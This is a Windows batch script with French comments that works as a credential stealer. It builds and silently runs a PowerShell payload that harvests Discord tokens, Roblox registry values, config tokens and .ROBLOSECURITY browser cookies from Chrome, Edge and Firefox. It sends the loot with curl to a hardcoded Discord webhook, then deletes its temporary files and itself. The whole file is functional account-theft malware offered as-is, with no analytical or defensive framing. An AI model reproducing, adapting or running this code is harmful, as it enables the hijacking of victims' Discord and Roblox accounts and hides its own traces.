@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION MAXIMALE (AUCUNE DEPENDANCE EXTERNE)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL (TOUT EN UN)
set "psfile=%TEMP%\max_extract.ps1"
set "outfile=%TEMP%\max_result.txt"
(
echo # --- 1. TOKENS DISCORD (RECHERCHE ELARGIE) ---
echo $discordPaths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo # Pattern large : 3 groupes séparés par des points, chacun entre 20 et 80 caractères alphanumériques ou tirets/underscores
echo $patternDiscord = '[a-zA-Z0-9_\-]{20,80}\.[a-zA-Z0-9_\-]{6,30}\.[a-zA-Z0-9_\-]{20,100}'
echo foreach ($p in $discordPaths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -File -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $patternDiscord -AllMatches -ErrorAction SilentlyContinue ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens = $tokens ^| Select-Object -Unique
echo $discordTokens = $tokens -join ' '
echo.
echo # --- 2. ROBLOX : REGISTRE ET XML ---
echo $robloxUser = $null
echo $robloxRemember = $null
echo try {
echo     $robloxUser = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "UserID" -ErrorAction SilentlyContinue).UserID
echo } catch {}
echo try {
echo     $robloxRemember = (Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudio" -Name "RememberMe" -ErrorAction SilentlyContinue).RememberMe
echo } catch {}
echo $robloxXmlToken = $null
echo $xmlPath = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml"
echo if (Test-Path $xmlPath) {
echo     try {
echo         $xml = [xml](Get-Content $xmlPath -ErrorAction SilentlyContinue)
echo         if ($xml -and $xml.settings -and $xml.settings.token) { $robloxXmlToken = $xml.settings.token }
echo     } catch {}
echo }
echo.
echo # --- 3. ROBLOX : RECHERCHE DANS LES FICHIERS DE CONFIGURATION DU PLAYER ---
echo $robloxPlayerToken = $null
echo $playerDirs = @(
echo     "$env:LOCALAPPDATA\Roblox\Player",
echo     "$env:APPDATA\Roblox\Player"
echo )
echo $patternToken = '[a-zA-Z0-9_\-]{30,80}'
echo foreach ($dir in $playerDirs) {
echo     if (Test-Path $dir) {
echo         Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $patternToken -AllMatches -ErrorAction SilentlyContinue ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object {
echo             # Garder les chaînes qui ressemblent à des tokens (longueur > 30)
echo             if ($_.Length -gt 30 -and $_ -match '^[a-zA-Z0-9_\-]+$') { $robloxPlayerToken = $_; break }
echo         }
echo         if ($robloxPlayerToken) { break }
echo     }
echo }
echo.
echo # --- 4. ROBLOX : COOKIE .ROBLOSECURITY DANS LES COOKIES DES NAVIGATEURS (LECTURE BRUTE) ---
echo $robloxCookie = $null
echo $cookiePaths = @(
echo     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
echo     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
echo     "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite"
echo )
echo # Recherche de la chaîne .ROBLOSECURITY dans les fichiers binaires (approximatif)
echo foreach ($cp in $cookiePaths) {
echo     $resolved = $cp -replace '\*','' # simplification pour Firefox, on prend le premier profil
echo     if (Test-Path $resolved) {
echo         # Lire le fichier en tant que texte et chercher le motif
echo         Select-String -Path $resolved -Pattern 'ROBLOSECURITY=[a-zA-Z0-9_\-]{30,100}' -AllMatches -ErrorAction SilentlyContinue ^| ForEach-Object {
echo             $val = $_.Matches.Value -replace 'ROBLOSECURITY=',''
echo             if ($val.Length -gt 30) { $robloxCookie = $val }
echo         }
echo         if ($robloxCookie) { break }
echo     }
echo }
echo # Fallback : fichiers cookies texte (ancien)
echo if (-not $robloxCookie) {
echo     $textPaths = @("$env:APPDATA\Microsoft\Windows\Cookies", "$env:LOCALAPPDATA\Microsoft\Windows\INetCookies")
echo     foreach ($tp in $textPaths) {
echo         if (Test-Path $tp) {
echo             Get-ChildItem $tp -Filter *.txt ^| ForEach-Object {
echo                 Select-String -Path $_.FullName -Pattern 'ROBLOSECURITY=[a-zA-Z0-9_\-]{30,100}' -ErrorAction SilentlyContinue ^| ForEach-Object { $_.Matches.Value }
echo             } ^| ForEach-Object {
echo                 $val = $_ -replace 'ROBLOSECURITY=',''
echo                 if ($val.Length -gt 30) { $robloxCookie = $val }
echo             }
echo             if ($robloxCookie) { break }
echo         }
echo     }
echo }
echo.
echo # --- 5. CONSTRUCTION DU MESSAGE ---
echo $msg = ""
echo if ($discordTokens -ne "") { $msg += "=== TOKENS DISCORD ===`n$discordTokens`n`n" }
echo if ($robloxUser -ne $null -and $robloxUser -ne "") { $msg += "=== ROBLOX UserID ===`n$robloxUser`n`n" }
echo if ($robloxRemember -ne $null -and $robloxRemember -ne "") { $msg += "=== ROBLOX RememberMe ===`n$robloxRemember`n`n" }
echo if ($robloxXmlToken -ne $null -and $robloxXmlToken -ne "") { $msg += "=== ROBLOX Token (XML) ===`n$robloxXmlToken`n`n" }
echo if ($robloxPlayerToken -ne $null -and $robloxPlayerToken -ne "") { $msg += "=== ROBLOX Token (Player) ===`n$robloxPlayerToken`n`n" }
echo if ($robloxCookie -ne $null -and $robloxCookie -ne "") { $msg += "=== ROBLOX Cookie (.ROBLOSECURITY) ===`n$robloxCookie`n`n" }
echo if ($msg -eq "") { $msg = "Aucune donnee collectee.`n" }
echo $msg ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: ETAPE 2 : EXECUTION DU POWERSHELL (SILENCIEUX)
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: ETAPE 3 : LECTURE DU RESULTAT
set "msg="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "msg=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 4 : SI VIDE, DEFAUT
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: ETAPE 5 : ECHAPPEMENT JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 6 : ENVOI
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
